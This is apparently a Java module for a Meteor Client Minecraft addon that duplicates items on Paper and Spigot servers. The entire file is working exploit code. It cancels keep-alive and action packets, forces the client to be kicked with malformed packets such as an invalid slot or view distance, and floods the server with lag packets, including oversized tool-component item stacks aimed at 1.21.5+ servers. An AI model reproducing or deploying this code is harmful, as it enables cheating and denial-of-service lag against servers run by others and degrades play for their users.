package com.softcore.addon.modules;

import com.softcore.addon.SoftcoreAddon;
import com.softcore.addon.utils.timer.MsTimer;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.block.Block;
import net.minecraft.block.Blocks;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.ToolComponent;
import net.minecraft.entity.Entity;
import net.minecraft.entity.vehicle.ChestBoatEntity;
import net.minecraft.entity.vehicle.ChestMinecartEntity;
import net.minecraft.entity.vehicle.ChestRaftEntity;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.message.ChatVisibility;
import net.minecraft.network.packet.c2s.common.ClientOptionsC2SPacket;
import net.minecraft.network.packet.c2s.common.KeepAliveC2SPacket;
import net.minecraft.network.packet.c2s.common.SyncedClientOptions;
import net.minecraft.network.packet.c2s.play.*;
import net.minecraft.registry.Registries;
import net.minecraft.registry.entry.RegistryEntry;
import net.minecraft.registry.entry.RegistryEntryList;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.screen.sync.ItemStackHash;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.EntityHitResult;
import net.minecraft.util.hit.HitResult;

import java.util.ArrayList;
import java.util.List;

public class BundleDupe extends Module {
    private final SettingGroup sgDupe = settings.createGroup("Dupe Method");
    private final SettingGroup sgLag = settings.createGroup("Lag Method");
    private final Setting<DupeMethod> dupeMethod = this.sgDupe.add(new EnumSetting.Builder<DupeMethod>()
        .name("Dupe-method")
        .description("Method to dupe.")
        .defaultValue(DupeMethod.Kick)
        .build()
    );

    private final Setting<Integer> timeoutSeconds = this.sgDupe.add(new IntSetting.Builder()
        .name("timeout-seconds")
        .description("Seconds to wait before timeout kick.")
        .defaultValue(30)
        .min(1)
        .max(120)
        .sliderMax(120)
        .visible(() -> this.dupeMethod.get() == DupeMethod.Timeout)
        .build()
    );

    private final Setting<Integer> interactDelayMillisTimeout = this.sgDupe.add(new IntSetting.Builder()
        .name("interact-delay-(ms)")
        .description("The delay to wait before interacting with the bundle in milliseconds.")
        .defaultValue(650)
        .min(0)
        .sliderMax(1000)
        .visible(() -> this.dupeMethod.get() == DupeMethod.Timeout)
        .build()
    );

    private final Setting<KickMethod> kickMethod = this.sgDupe.add(new EnumSetting.Builder<KickMethod>()
        .name("kick-method")
        .description("Method to kick urself from the server.")
        .defaultValue(KickMethod.HurtSelf)
        .visible(() -> this.dupeMethod.get() == DupeMethod.Kick)
        .build()
    );

    private final Setting<String> customKickCommand = this.sgDupe.add(new StringSetting.Builder()
        .name("custom-kick-command")
        .description("Custom Meteor command to execute for kicking (e.g., .kick hurt).")
        .defaultValue(".kick hurt")
        .visible(() -> this.dupeMethod.get() == DupeMethod.Kick && this.kickMethod.get() == KickMethod.CustomCommand)
        .build()
    );

    private final Setting<LagMethod> lagMethod = this.sgLag.add(new EnumSetting.Builder<LagMethod>()
        .name("lag-method")
        .description("Method to create lag for the dupe.")
        .defaultValue(LagMethod.ClickSlot)
        .build()
    );

    private final Setting<String> customLagCommand = this.sgLag.add(new StringSetting.Builder()
        .name("custom-lag-command")
        .description("Custom Meteor command to execute for lag.")
        .defaultValue(".t custom-lag-module")
        .visible(() -> this.lagMethod.get() == LagMethod.CustomCommand)
        .build()
    );

    private final Setting<Integer> boatNbtPackets = this.sgLag.add(new IntSetting.Builder()
        .name("boat-nbt-packets")
        .description("Amount of ClientCommand packets to send for boat NBT lag. (U Need to sit in a ChestBoat)")
        .defaultValue(200)
        .min(1)
        .sliderMax(1000)
        .visible(() -> this.lagMethod.get() == LagMethod.BoatNBT)
        .build()
    );

    private final Setting<Integer> entityNbtPackets = this.sgLag.add(new IntSetting.Builder()
        .name("entity-nbt-packets")
        .description("Amount of InteractEntity packets to send. ( U Need to look at a ChestBoat)")
        .defaultValue(200)
        .min(1)
        .sliderMax(1000)
        .visible(() -> this.lagMethod.get() == LagMethod.EntityNBT)
        .build()
    );

    private final Setting<Integer> clickslotPackets = this.sgLag.add(new IntSetting.Builder()
        .name("clickslot-nbt-packets (NBT Book in INV)")
        .description("Amount of Clickslot packets to send. (Needs NBT Book in Inv)")
        .defaultValue(200)
        .min(1)
        .sliderMax(1000)
        .visible(() -> this.lagMethod.get() == LagMethod.ClickSlot)
        .build()
    );

    private final Setting<Integer> exploitPackets = this.sgLag.add(new IntSetting.Builder()
        .name("lag-exploit-packets (1.21.5+ Server only)")
        .description("Amount of Lag packets to send. (Only works on 1.21.5+ Servers)")
        .defaultValue(30)
        .min(1)
        .max(200)
        .sliderMax(100)
        .visible(() -> this.lagMethod.get() == LagMethod.LagExploit)
        .build()
    );

    private final Setting<Integer> exploitSize = this.sgLag.add(new IntSetting.Builder()
        .name("size")
        .description("Size of the Lag Packets. (Only works on 1.21.5+ Servers)")
        .defaultValue(2000)
        .min(1)
        .max(2000)
        .sliderMax(2000)
        .visible(() -> this.lagMethod.get() == LagMethod.LagExploit)
        .build()
    );
    private boolean cancelKeepAlive = false;
    private boolean dupeActivated = false;
    private boolean waitingForKeepAlive = false;


    public BundleDupe() {
        super(SoftcoreAddon.CATEGORY, "bundle-dupe", "Works on Paper and Spigot; Look on dupedb.net for settings info; Credit to Nummernuts and numberz <3");
    }

    @Override
    public void onActivate() {
        if (this.lagMethod.get() == LagMethod.BoatNBT) {
            if (this.mc.player == null) {
                return;
            }

            Entity vehicle = this.mc.player.getVehicle();
            boolean isValidVehicle =
                vehicle instanceof ChestBoatEntity ||
                    vehicle instanceof ChestRaftEntity ||
                    vehicle instanceof ChestMinecartEntity;

            if (!isValidVehicle) {
                this.error("You must be sitting in a Chest Boat or Minecart with Chest for this Lag Method!");
                this.toggle();
                return;
            }
        }

        if (this.lagMethod.get() == LagMethod.EntityNBT) {
            if (this.mc.crosshairTarget == null || this.mc.crosshairTarget.getType() != HitResult.Type.ENTITY) {
                this.error("You must be looking at a Chest Boat or Minecart with Chest for this Lag Method!");
                this.toggle();
                return;
            }

            Entity target = ((EntityHitResult) this.mc.crosshairTarget).getEntity();
            boolean isValidTarget = target instanceof ChestBoatEntity || target instanceof ChestRaftEntity || target instanceof ChestMinecartEntity;
            if (!isValidTarget) {
                this.error("Target is not a Chest Boat or Minecart with Chest!");
                this.toggle();
                return;
            }
        }

        this.dupeActivated = true;
        switch (this.dupeMethod.get().ordinal()) {
            case 0 -> this.executeTimeoutDupe();
            case 1 -> this.executeKickDupe();
        }

    }

    @Override
    public void onDeactivate() {
        this.cancelKeepAlive = false;
        this.dupeActivated = false;
        this.waitingForKeepAlive = false;
    }

    // Events
    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        this.toggle();
    }

    @EventHandler
    private void onPacketSend(PacketEvent.Send event) {
        if (this.dupeActivated && event.packet instanceof PlayerActionC2SPacket) {
            event.cancel();
        }

        if (event.packet instanceof KeepAliveC2SPacket) {
            if (this.waitingForKeepAlive) {
                this.waitingForKeepAlive = false;
                this.cancelKeepAlive = true;
                ChatUtils.info("KeepAlive sent - Starting timeout countdown for " + this.timeoutSeconds.get() + " seconds...");

                MsTimer.schedule(() -> {
                    if (this.isActive()) {
                        MsTimer.schedule(() -> mc.execute(() -> {
                            this.sendInteractItem();
                            this.executeLagMethod();
                            ChatUtils.info("Timeout Dupe executed!");
                            this.toggle();
                        }), this.interactDelayMillisTimeout.get());
                    }
                }, this.timeoutSeconds.get() * 1000);
            } else if (this.cancelKeepAlive) {
                event.cancel();
            }
        }
    }

    private void executeTimeoutDupe() {
        ChatUtils.info("Timeout Dupe activated - Waiting for next KeepAlive packet...");
        this.waitingForKeepAlive = true;
    }

    private void executeKickDupe() {
        assert mc.getNetworkHandler() != null;
        assert mc.player != null;
        ChatUtils.info("Executing Kick Dupe...");
        this.executeLagMethod();
        this.sendInteractItem();
        switch (this.kickMethod.get()) {
            case HurtSelf:
                this.mc.getNetworkHandler().sendPacket(PlayerInteractEntityC2SPacket.attack(mc.player, false));
                break;
            case ClientSettings:
                SyncedClientOptions syncedClientOptions = new SyncedClientOptions(this.mc.options.language,
                    -2,
                    ChatVisibility.FULL,
                    this.mc.options.getChatColors().getValue(),
                    127,
                    this.mc.options.getMainArm().getValue(),
                    false,
                    false,
                    this.mc.options.getParticles().getValue());
                this.mc.getNetworkHandler().sendPacket(new ClientOptionsC2SPacket(syncedClientOptions));
                break;
            case UpdateSlot:
                this.mc.getNetworkHandler().sendPacket(new UpdateSelectedSlotC2SPacket(-1));
                break;
            case CustomCommand:
                this.executeCommand(this.customKickCommand.get());
        }

        this.executeLagMethod();
        ChatUtils.info("Kick Dupe executed!");
        MsTimer.schedule(() -> mc.execute(() -> {
            if (this.isActive()) {
                this.toggle();
            }
        }), 100L);
    }

    private void sendInteractItem() {
        assert mc.player != null;
        assert mc.getNetworkHandler() != null;
        PlayerInteractItemC2SPacket packet = new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, 0, this.mc.player.getYaw(), this.mc.player.getPitch());
        this.mc.getNetworkHandler().sendPacket(packet);
    }

    private void executeLagMethod() {
        switch (this.lagMethod.get()) {
            case CustomCommand -> this.executeCommand(this.customLagCommand.get());
            case BoatNBT -> this.sendBoatNbtPackets();
            case ClickSlot -> this.sendClickSlotPackets();
            case EntityNBT -> this.sendEntityNbtPackets();
            case LagExploit -> this.sendExploitPackets();
        }

    }

    // Lag
    private void sendBoatNbtPackets() {
        assert mc.getNetworkHandler() != null;
        assert mc.player != null;
        for (int i = 0; i < this.boatNbtPackets.get(); ++i) {
            ClientCommandC2SPacket packet = new ClientCommandC2SPacket(this.mc.player, ClientCommandC2SPacket.Mode.OPEN_INVENTORY);
            this.mc.getNetworkHandler().sendPacket(packet);
        }
        this.info("Sent " + this.boatNbtPackets.get() + " Boat NBT packets.");
    }

    private void sendEntityNbtPackets() {
        assert mc.player != null;
        assert mc.getNetworkHandler() != null;

        HitResult target = this.mc.crosshairTarget;
        if (target != null && target.getType() == HitResult.Type.ENTITY) {
            Entity entity = ((EntityHitResult) target).getEntity();

            for (int i = 0; i < this.entityNbtPackets.get(); ++i) {
                PlayerInteractEntityC2SPacket packet = PlayerInteractEntityC2SPacket.interact(entity, true, Hand.MAIN_HAND);
                this.mc.getNetworkHandler().sendPacket(packet);
            }

            this.info("Sent " + this.entityNbtPackets.get() + " Interact packets.");
        } else {
            this.error("§cYou must be looking at an entity (Chest Boat or Minecart)!");
        }
    }

    private void sendClickSlotPackets() {
        assert mc.player != null;
        assert mc.getNetworkHandler() != null;
        for (int i = 0; i < this.clickslotPackets.get(); ++i) {
            ClickSlotC2SPacket packet = new ClickSlotC2SPacket(0, 0, (short) 0, (byte) 0, SlotActionType.PICKUP, new Int2ObjectArrayMap<>(), ItemStackHash.EMPTY);
            this.mc.getNetworkHandler().sendPacket(packet);
        }

        this.info("Sent " + this.clickslotPackets.get() + " Clickslot packets.");
    }

    private void sendExploitPackets() {
        assert mc.getNetworkHandler() != null;
        ItemStack stack = new ItemStack(Items.STONE);
        List<RegistryEntry<Block>> entries = new ArrayList<>();
        RegistryEntry<Block> blockEntry = Registries.BLOCK.getEntry(Blocks.STONE);

        for (int i = 0; i < this.exploitSize.get(); ++i) {
            entries.add(blockEntry);
        }

        RegistryEntryList<Block> registryList = RegistryEntryList.of(entries);
        ToolComponent.Rule rule = ToolComponent.Rule.of(registryList, 6.0F);
        ToolComponent toolComponent = new ToolComponent(List.of(rule), 1.0F, 1, true);
        stack.set(DataComponentTypes.TOOL, toolComponent);
        Int2ObjectMap<ItemStackHash> modifiedSlots = new Int2ObjectArrayMap<>(128);

        for (int i = 0; i < 128; ++i) {
            modifiedSlots.put(i, ItemStackHash.fromItemStack(stack, component -> -1));
        }

        for (int i = 0; i < this.exploitPackets.get(); ++i) {
            ClickSlotC2SPacket packet = new ClickSlotC2SPacket(0, 0, (short) 0, (byte) 0, SlotActionType.PICKUP, modifiedSlots, ItemStackHash.fromItemStack(stack, component -> -1));
            this.mc.getNetworkHandler().sendPacket(packet);
        }

        this.info("Sent " + this.exploitPackets.get() + " Lag packets.");
    }

    private void executeCommand(String command) {
        if (command != null && !command.isEmpty()) {
            ChatUtils.sendPlayerMsg(command);
        }
    }

    public enum DupeMethod {
        Timeout,
        Kick
    }

    public enum KickMethod {
        HurtSelf,
        ClientSettings,
        UpdateSlot,
        CustomCommand
    }

    public enum LagMethod {
        CustomCommand,
        BoatNBT,
        ClickSlot,
        EntityNBT,
        LagExploit
    }


}
